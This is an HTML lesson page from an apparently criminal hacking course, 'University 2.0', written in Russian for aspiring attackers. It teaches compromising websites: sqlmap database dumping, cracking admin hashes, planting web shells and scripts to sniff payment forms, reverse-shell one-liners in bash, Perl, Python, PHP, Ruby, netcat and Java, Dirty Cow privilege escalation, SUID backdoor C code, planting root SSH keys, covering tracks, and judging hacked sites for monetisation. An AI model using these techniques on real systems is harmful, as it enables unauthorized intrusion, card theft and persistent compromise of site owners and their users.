@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="source/favicon.ico" type="image/x-icon">
+    <title>Уроки | University 2.0</title>
+    <link rel="stylesheet" href="source/main.css">
+    <link rel="stylesheet" href="source/style.css">
+
+    <link rel="stylesheet" href="source/tikets.css">
+    <link rel="stylesheet" href="source/profile_window.css">
+
+    <link rel='stylesheet' href="source/default.css">
+    <link rel='stylesheet' href="source/idea.css">
+    <script type="text/javascript" src="source/highlight.pack.js"></script>
+</head>
+<body>
+
+
+    <div id="myfond_gris" opendiv=""></div>
+    <div align="center" style="padding-top:35px;">
+        <div id="box_1" class="mymagicoverbox_fenetre" style="left:-225px; width:450px;">
+            Anon | 00500
+            <div class="mymagicoverbox_fenetreinterieur" style="height:220px; ">
+                <div align="left">
+                    <p class="lead">Имя пользователя: Anon</p>
+                    <p class="lead">Статус: Активен</p>
+                    <p class="lead">Регистрация jabber: <a target="_blank" href="http://plast.cash/registration.php?key="></a></p>
+                    <p class="lead">Поток: Anon</p>
+                    <p class="lead">TG канал: <a target="_blank" href="">Канал для опретивных оповещений</a></p>
+                    
+                    <br><br>
+                    <div style="width:100px" align="center" class="mymagicoverbox_fermer">Закрыть</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+<div class="main_container">
+    <header>
+        <a href="index.html"><img class="logo" src="source/logo.png" alt="University 2.0"></a>
+        <div class="header_right">
+            <div class="user_info">
+                <p>Hello,
+                <a href="#" iddiv="box_1" class="mymagicoverbox"> Anon </a>
+
+
+                </p>
+                <p>ID: 00500</p>
+            </div>
+            <div class="user_actions">
+                <a href="help.html"
+                   class="btn btn_gray btn_transparent btn_border_transparent btn_icon btn_icon_help">Помощь</a>
+                
+                    
+                    <a href="index.html" class="btn  btn_round btn_status btn_status_active btn_gray btn_exit">Выход</a>
+                
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <nav>
+            <a href="index.html" class="btn btn_icon btn_icon_dashboard ">Сводка</a>
+            <a href="lections.html" class="btn btn_icon btn_icon_book active">Лекции</a>
+            <a href="index.html" class="btn btn_icon btn_icon_group ">Тикеты</a>
+            <a href="faq.html" class="btn btn_icon btn_icon_chat ">FAQ</a>
+        </nav>
+        <div class="content">
+
+<a href="hack.html">       
+    <div class="banner_block" style="background-image:url('source/hack_9X2ouwy.jpg')">
+        <div class="banner_content">
+            <h2>Хак</h2>
+            <p>Лучшая защита - это нападение.</p>
+        </div>
+    </div>
+    </a>
+    <br>
+
+            
+
+            
+    <div class="article_actions">
+        <a href="hack.html" class="btn btn_round btn_gray  btn_icon btn_icon_back ">Назад</a>
+    </div>
+
+
+  <div class="text_content">
+        <h3><strong>База</strong></h3>
+
+<p>Успешность атаки - это разница между желаемым результатом и полученным. Например желаемым результатом было получить доступ к БД сайта и ты его получил, а значит атака прошла успешно. Теперь тебе нужно узнать информацию от какого пользователя работает БД и является ли этот пользователь привелигированным, а также имя текущей базы данных и список всех баз. У sqlmap`а есть параметры позволяющие эту информацию получить.</p>
+
+<ul>
+    <li>--current-user - текущий пользователь</li>
+    <li>--is-dba - является ли он администратором</li>
+    <li>--current-db - текущая БД</li>
+    <li>--dbs - список баз в СУБД</li>
+</ul>
+
+<p>Далее опять все будет зависеть от целей, например ты ищешь таблицы содержащие имена пользователей, такие колонки будут содержать слово user или username. Провести неточный поиск (в данном случае только на вхождение подстроки в строке) можно с помощью патаметра --search</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ sqlmap -u &#39;site&#39; --search -C user</tt></div>
+
+<p>Эта команда попросит sqlmap найти все таблицы в именах колонок которых содержится слово &#39;user&#39;. Хотя скульмап задаст вопрос о том как именно провести поиск, по точному совпадению (exact) или по неточному (like). И в реальной жизни крайне рекомендую всегда использовать любой универсальный тампер и --random-agent, последний вообще must-have.</p>
+
+<h3><strong>Админка</strong></h3>
+
+<p>По анализу БД особо говорить то и нечего, слил то что нужно и пошел своей дорогой. А если тебе нужен доступ к админке, то это уже интереснее. Удобно получится если есть доступ к БД с которой ты можешь слить учетные данные, а так как об анализе цели до атаки я тебе уже рассказал, то на руках у тебя админка и данные для доступа к ней. Единственное препятствие - это шифрование пароля в md5 или еще как. Я уже давал ссылку на сайт cmd5.ru, а вот еще один хороший сайт <a href="https://hashkiller.co.uk/md5-decrypter.aspx" target="_blank">hashkiller</a>, который тебе может в этом помочь. Это онлайн способы, также есть еще и офлайн способы. Например sqlmap в любом случае предложит тебе брутануть хеши по словарю, так что можешь запастись словарем, который ты будешь использовать. Кроме sqlmap есть и специализированный софт идущий в комплекте с кали - <a href="https://hashcat.net/hashcat/" target="_blank">hashcat</a>. Ничего в нем сложного нет, ты вполне справишься тут сам.</p>
+
+<p>Попав в админку стоит изучить, какие возможности она тебе предоставляет, например если твоя цель пролить шелл, то тебе нужно отыскать все места откуда ты можешь залить какой-то файл, или если твоя цель снифинг формы оплаты, то ты можешь поискать места где возможно редактирование шаблона для формы оплаты. Варианты тут бывают разные, некоторые движки предоставляют возможность менять код php, как в случае с друпал например, а некоторые дают возможность менять только код шаблона, т.е. html. А иногда части кода шаблона хранятся в базе данных, а админка предоставляет механизм бекапинга и восстановления таблиц БД, где ты сможешь отыскать таблицу, которая хранит, например код для отображения шапки сайта. Выполнить бекап, вставить свой скрипт и восстановиться из бекапа. Т.е. вариантов также много и все зависит от ситуации.</p>
+
+<h3><strong>Веб-шелл</strong></h3>
+
+<p>Предположим твоя задача загрузить вебшелл, на самом деле это должна быть твоя основная задача, так как пароль на админку могут сменить, а дырку в sql могут закрыть, и у тебя это получилось. Тогда тебе нужно первым делом спрятаться. Потом уже ты должен изучить свою область влияния, а также собрать для себя необходимую информацию. И опять же, ты должен проанализировать файлы сайта в зависимости от твоей цели, если твоя цель - это трафик, то ты должен установить свой скрипт куда нибудь в шаблон сайта, так чтобы он отрабатывал всегда. А всегда на странице есть 2 элемента: футер и шапка. Тело страницы может постоянно меняться. И тут опять же все зависит от ситуации, некоторые движки в файлах для каждого шаблона имеют файл с говорящим названием footer.php, в котором хранится код для футера сайта. Футер - это часть страницы внизу, в которой обычно пишут копирайт и другую хрень, которая мало кого интересует. Также стоит оставить себе маленькие закладки, а после работы с сайтом удалить свой веб-шелл, так как он может быть обнаружен, а когда админ находит у себя следы проникновения то с вероятностью в 98% он просто переустановит сервер.</p>
+
+<h3><strong>Шелл</strong></h3>
+
+<p>Получение прямого доступа к шеллу возможно через бекдор, что было рассмотрено в статье по веб-шелам. Да и несложное это занятие. Интереснее рассмотреть бек-коннект способы. Список команд для получения реверс шелла:</p>
+
+<p>bash, работает только в старых версиях.</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</tt></div>
+
+<p>где 10.0.0.1 - это адрес твоего сервера, а 8080 порт на который ты должен прибиндить nc например.</p>
+
+<p>Perl</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</tt></div>
+
+<p>Python</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</tt></div>
+
+<p>PHP</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</tt></div>
+
+<p>Ruby</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</tt></div>
+
+<p>Netcat</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ nc -e /bin/sh 127.0.0.1 4444</tt></div>
+
+<p>Еще раз netcat</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f</tt></div>
+
+<p>Java</p>
+
+<div>
+<pre>
+<code class="language-java">r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()</code></pre>
+</div>
+
+<p>А теперь давая я покажу тебе где это может пригодиться. Открой терминал кали и запусти неткат на прослушивание порта.</p>
+
+<p><a href="source/rs1.png"><img alt="" src="source/rs1.png" style="height:400px; width:100%" /></a></p>
+
+<p>В кали неткат на отрез отказывался слушать указываемый мной в параметрах порт пока я не указал аргумент -p, подробнее в мане. Теперь перейди в dvwa на страницу &quot;Command Injection&quot;, чтобы не париться, сложность я выставил в Low. И вбиваешь команду на подключение сервера к тебе</p>
+
+<p><a href="source/rs2.png"><img alt="" src="source/rs2.png" style="height:400px; width:100%" /></a></p>
+
+<p>&amp; - в конце нужен, что бы не зафризить сервер, который будет ждать окончания выполнения команды. И результат, как говорится, на лицо ;-)</p>
+
+<p><a href="source/rs3.png"><img alt="" src="source/rs3.png" style="height:400px; width:100%" /></a></p>
+
+<p>Что дальше? Для начала тебе нужно исследовать сервер, в этом может помочь скрипт для сбора информации, скачать который ты можешь с ФО <a href="files/Additional2.zip" target="_blank">Additional2.zip</a>.</p>
+
+
+
+<p>Первое с чего можно тут начать - это определить возможности повышения привелегий.</p>
+
+<h3><strong>Privilege Escalation</strong></h3>
+
+<p>Повысить привелегии можно 3-мя путями: использовать сплоит и найти в кроне доступный для записи файл и запускаемый от рута. Начнем с эксплоитов, а для того чтобы заюзать сплоит надо определить версию ядра</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>uname -a</tt></div>
+
+<p>И узнать название дистрибутива</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>cat /etc/issue</tt></div>
+
+<p><a href="source/pe1_YSNqgKS.png"><img alt="" src="source/pe1_YSNqgKS.png" style="height:400px; width:100%" /></a></p>
+
+<p>Теперь надо выяснить по версии ядра и году его обновления наличие эксплоитов для полвышения привелегий. Сделать это можно опять же загуглив.</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>Privilege Escalation linux 3.2</tt></div>
+
+<p>Еще иногда в информации о версии ядра указывается дата обновления, которую надо учесть, так как версия может быть уязвимой, а обнова 2018-го года, т.е. был выпущен патч который закрыл уязвимость под это ядро. Тогда остается искать другие пути или надеяться, верить и ждать выхода сплоита.</p>
+
+<p>Под данную версию ты сможешь найти уязвимость&nbsp;CVE-2016-5195 &quot;Dirty Cow&quot;. Теперь можно искать сплоит под данную уязвимость, например на exploit-db или на <a href="https://rdot.org/forum/forumdisplay.php?s=654b76d809956bd0878d3a4fa11e829e&amp;f=24" target="_blank">rdot</a>. На втором сайте есть сплоит прямо под bash. Т.е. остается скопировать код сплоита на сервер и запустить.</p>
+
+<p><a href="source/pe2.png"><img alt="" src="source/pe2.png" style="height:400px; width:100%" /></a></p>
+
+<p>Все, мы получаем euid root и добавляемся в группу рут. Теперь получим uid root. 2 варианта опять же: редатирование /etc/sudoers и /etc/passwd. На данный момент мы уже можем редактировать файлы принадлежащие руту. Открываем /etc/sudoers и добвляем запись, которая позволит нашему пользователю, от которого мы знаем пароль, использовать команду sudo со своим паролем.</p>
+
+<p><a href="source/pe3.png"><img alt="" src="source/pe3.png" style="height:400px; width:100%" /></a></p>
+
+<p>Теперь можно стать полноправным рутом</p>
+
+<p><a href="source/pe4.png"><img alt="" src="source/pe4.png" style="height:400px; width:100%" /></a></p>
+
+<p>Того же результата можно было бы добиться отредактировав файл /etc/shadow и присвоить руту хешь пароля текущего пользователя. Главное сохранить его хеш себе, чтобы потом вернуть все на место.</p>
+
+<p>Иногда сплоиты нужно компилировать, информация по компиляции идет с эксплоитом, учесть тут нужно следующее либо на сервере должны стоять нужные компоненты (gcc, g++, etc) либо надо искать версию ядра и ОС и ставить ее себе на виртуалку, где проводить компиляцию и грузить на жертву уже скомпилированный сплоит. Ничего сложного, ловкость рук и никакого мошенничества.</p>
+
+<p>Теперь надо намутить себе бекдор. Вариантов несколько, я расскажу 2: простой и сложный (хотя есть еще сложнее). Оба варианта завязаны на создании себе лазейки через установку флага suid на исполняемый файл. Т.е. если ты не хочешь создавать какой то файл (известным только тебе причинам) ты можешь прибить флаг SUID на nano и тем самым получишь доступ к редактированию любого файла. Давай я просто покажу тебе</p>
+
+<p><a href="source/suid1.png"><img alt="" src="source/suid1.png" style="height:400px; width:100%" /></a></p>
+
+<p>Как видишь по дефолту даже читать /etc/shadow нельзя. Теперь ставим на nano флаг suid</p>
+
+<p><a href="source/suid2.png"><img alt="" src="source/suid2.png" style="height:400px; width:100%" /></a></p>
+
+<p>И теперь можно открыть файл /etc/shadow от имени обычного пользователя и он будет доступен на запись</p>
+
+<p><a href="source/suid3.png"><img alt="" src="source/suid3.png" style="height:400px; width:100%" /></a></p>
+
+<p><a href="source/suid4.png"><img alt="" src="source/suid4.png" style="height:400px; width:100%" /></a></p>
+
+<p>Теперь если тебе нужно получить рута и ты знаешь пароль текущего пользователя (или можно сгенерировать хеш), ты можешь указать его руту и выполнить sudo su и указать пароль хеш которого поставил. Главное потом вернуть все на места и не забыть установить старую дату изменения файлов которые менял.</p>
+
+<p>Вариант сложнее, создаем файл на сервере с именем shell.c от рута, тут важно только расширение.</p>
+
+<p><a href="source/suid5.png"><img alt="" src="source/suid5.png" style="height:400px; width:100%" /></a></p>
+
+<p>Вставляем этот код, сохраняем и компилим через gcc, в папке появится скомпилированный файл с именем указанным в параметре -o и также ставим флаг suid</p>
+
+<p><a href="source/suid7.png"><img alt="" src="source/suid7.png" style="height:400px; width:100%" /></a></p>
+
+<p>Теперь можно запустить его от имени любого пользовтеля и ты получишь рутовую сессию баш</p>
+
+<p><a href="source/suid8.png"><img alt="" src="source/suid8.png" style="height:400px; width:100%" /></a></p>
+
+<p>Вот только имя дать по-проще и спрятать по-дальше.</p>
+
+<div>
+<pre>
+<code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+int main()
+{
+   setuid( 0 );
+   system( "/bin/bash" );
+
+   return 0;
+}
+</code></pre>
+</div>
+
+<p>Если на сервере нет gcc, можно компилить у себя как в случае с исходниками на повышение привелегий требующие компиляции.</p>
+
+<p>Также, руту можно грузануть ssh ключ и тогда не потребуется знание пароля. Т.е. после повышения привелегий, тебе нужно перейти в каталог /root/.ssh. В этом каталоге хранятся настройки ссш для пользователя, в данном случае для рута. SSH поддерживает аутентификацию пользователя по ключу, что я вляется более безопасным способом, а для того чтобы аутентифицировать пользователя, требуется чтобы на сервере хранился публичный ключ пользователя. Публичные ключи пользователей хранятся, в данном случае, по пути /root/.ssh/authorized_keys. Т.е. для того чтобы авторизоваться в рута по ключам, нужно в этот файл поместить свой публичный ключ. Начнем с генерации ключей для себя, открой терминал и выполни команду</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ ssh-keygen</tt></div>
+
+<p>В простом варианте не нужно ничего менять и просто на все вопросы отвечать тапом по Enter. Таким образом будет создана пара ключей в каталоге `/{USER}/.ssh`, в нем файл id_rsa является твоим приватным ключем, а id_rsa.pub - публичным. Теперь делаешь</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ cat ~/.ssh/id_rsa.pub</tt></div>
+
+<p>копируешь вывод и вставляешь на сервере в файл /root/.ssh/authorized_keys. После этого ты можешь логиниться по ссш к руту без указания пароля.</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ ssh root@domain</tt></div>
+
+<p>SSH по умолчанию пытается подхватить ключи из папки .ssh расположенной в домашнем каталоге пользователя. Если требуется в ручную указать путь к ключам, то используй параметр -i</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ ssh root@domain -i /var/id_rsa</tt></div>
+
+<p>т.е. указывается именно путь к приватному ключу.</p>
+
+<p><a href="source/ssh_key_copy.gif"><img alt="" src="source/ssh_key_copy.gif" style="height:400px; width:100%" /></a></p>
+
+<p>Как видно на гифке, даже если у пользователя нет папки .ssh это не значит, что ее нельзя создать.</p>
+
+<p>Таким образом можно закрепиться на машине, после успешного взлома. Также еще можно посмотреть кол-во файлов и сетевых соединений</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ df -h &amp;&amp; netstat -tunp | grep :80 | wc</tt></div>
+
+<p>или, если нет netstat</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>$ ss -plna | grep :80 | wc</tt></div>
+
+<p>Если диски заняты под завязку, а также на сервере больше 100 активных соединений, то сайт можно считать популярным, с интересным контентом и уже отсюда можно отталкиваться думая о том как его монетизировать. Хотя я за то чтобы иметь план еще до взлома.</p>
+    </div>
+    <br>
+
+
+ 
+        </div>
+    </div>
+</div>
+<footer>
+    <p>University 2.0</p>
+</footer>
+
+</body>
+</html>
